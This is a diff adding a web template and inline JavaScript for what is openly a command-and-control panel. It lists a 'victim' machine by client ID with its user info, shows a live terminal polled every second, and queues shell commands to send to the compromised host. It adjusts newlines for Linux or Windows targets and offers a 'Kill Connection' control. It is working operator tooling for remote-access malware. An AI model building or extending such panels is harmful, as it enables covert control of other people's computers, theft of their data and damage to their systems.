@@ -1,0 +1,155 @@
+{% extends "layout.html" %}
+{% block title %}Victim {{ victim.client_id }}{% endblock %}
+{% block content %}
+<h2>Victim Details: ID {{ victim.client_id }}</h2>
+
+<div class="mb-3">
+  <strong>User Info:</strong>
+  <pre>{{ victim.userinfo }}</pre>
+</div>
+
+{% with messages = get_flashed_messages() %}
+  {% if messages %}
+    <div class="alert alert-info">
+      {% for m in messages %}
+        {{ m }}<br>
+      {% endfor %}
+    </div>
+  {% endif %}
+{% endwith %}
+
+<h4>Live Terminal Output</h4>
+<div id="terminal" style="
+  width:100%; height:400px; background:#111; color:#0f0; 
+  overflow-y:auto; font-family:monospace; padding:10px; 
+  white-space:pre-wrap; border:1px solid #555;">
+</div>
+<div class="mt-2">
+  <input type="text" id="commandInput" class="form-control" style="display:inline-block; width:70%;" placeholder="Enter command...">
+  <button id="sendBtn" class="btn btn-primary">Send</button>
+</div>
+
+<div class="mt-3">
+  <form action="{{ url_for('kill_connection', client_id=victim.client_id) }}" method="post" style="display:inline;">
+    <button type="submit" class="btn btn-danger">Kill Connection</button>
+  </form>
+  <form action="{{ url_for('victim_detail', client_id=victim.client_id) }}" method="get" style="display:inline;">
+    <button type="submit" class="btn btn-secondary">Refresh Details</button>
+  </form>
+</div>
+
+<div class="mt-4">
+  <h5>Command History (non-interactive)</h5>
+  <form action="{{ url_for('clear_responses', client_id=victim.client_id) }}" method="post">
+    <button type="submit" class="btn btn-sm btn-outline-secondary">Clear History</button>
+  </form>
+  {% if victim.responses and victim.responses|length > 0 %}
+    <table class="table table-sm mt-2">
+      <thead>
+        <tr><th>Timestamp</th><th>Response</th></tr>
+      </thead>
+      <tbody>
+      {% for ts, resp in victim.responses.items() %}
+        <tr>
+          <td>{{ ts }}</td>
+          <td>{{ resp }}</td>
+        </tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  {% endif %}
+</div>
+
+<script>
+  // Determine if the victim's user info indicates Linux.
+  const isLinux = {% if "linux" in victim.userinfo|lower %}true{% else %}false{% endif %};
+
+  let userScrolling = false;
+  const terminalDiv = document.getElementById("terminal");
+
+  terminalDiv.addEventListener("scroll", () => {
+    const threshold = 50;
+    userScrolling = terminalDiv.scrollTop + terminalDiv.clientHeight < terminalDiv.scrollHeight - threshold;
+  });
+
+  function fetchTerminal() {
+    fetch("/get_log/{{ victim.client_id }}")
+      .then(response => response.text())
+      .then(text => {
+        terminalDiv.textContent = text;
+        if (!userScrolling) {
+          terminalDiv.scrollTop = terminalDiv.scrollHeight;
+        }
+      })
+      .catch(err => console.error("Error fetching terminal log:", err));
+  }
+  setInterval(fetchTerminal, 1000); // Poll every second
+
+  const cmdInput = document.getElementById("commandInput");
+  const sendBtn = document.getElementById("sendBtn");
+
+  // Command queue variables
+  let commandQueue = [];
+  let processing = false;
+
+  // Enqueue a command for processing.
+  function enqueueCommand(cmd) {
+    commandQueue.push(cmd);
+    processQueue();
+  }
+
+  // Process the command queue sequentially.
+  // This function sends the next command as soon as the previous one is finished.
+  function processQueue() {
+    if (processing || commandQueue.length === 0) return;
+    processing = true;
+    const cmdToSend = commandQueue.shift();
+
+    const formData = new FormData();
+    formData.append("client_id", "{{ victim.client_id }}");
+    formData.append("command", cmdToSend);
+
+    fetch("{{ url_for('send_command') }}", {
+      method: "POST",
+      body: formData
+    })
+    .then(response => response.text())
+    .then(result => {
+      console.log("Command sent:", result);
+      fetchTerminal();
+    })
+    .catch(err => console.error("Error sending command:", err))
+    .finally(() => {
+      processing = false;
+      // Immediately process the next command in the queue (if any)
+      processQueue();
+    });
+  }
+
+  // When the user submits a command, add it to the queue.
+  function sendAjaxCommand(e) {
+    e.preventDefault();
+    let cmd = cmdInput.value.trim();
+    if (!cmd) return;
+    cmdInput.value = "";
+
+    // Append appropriate newlines so the shell recognizes the command as complete.
+    if (isLinux) {
+      cmd += "\n\n";   // For Linux, send extra newline(s)
+    } else {
+      cmd += "\n";     // For Windows, usually one newline is enough
+    }
+    
+    enqueueCommand(cmd);
+  }
+
+  sendBtn.addEventListener("click", sendAjaxCommand);
+  cmdInput.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      sendAjaxCommand(e);
+    }
+  });
+</script>
+
+{% endblock %}
